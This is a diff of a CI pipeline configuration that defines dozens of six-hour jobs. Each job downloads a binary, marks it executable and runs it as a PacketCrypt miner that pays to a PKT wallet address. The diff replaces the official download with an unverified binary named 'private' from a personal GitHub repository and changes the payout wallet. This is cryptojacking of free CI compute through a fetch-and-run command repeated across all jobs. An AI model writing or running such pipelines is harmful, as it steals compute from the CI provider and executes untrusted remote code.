@@ -13,409 +13,409 @@ jobs:
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ab
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ac
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ad
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ae
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: af
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ag
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ah
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: aj
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ak
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: al
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: am
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: an
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ao
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ap
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: aq
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ar
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: as
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: at
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: au
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: av
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: aw
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ax
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: az
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ba
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bb
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bc
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bd
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bf
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bg
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bh
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bi
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bj
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bk
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bl
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bm
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bn
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bo
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bp
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bq
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: br
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bs
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bt
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bu
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bv
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bw
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bx
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: by
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: bz
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
-  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+  - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 - job: ca
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
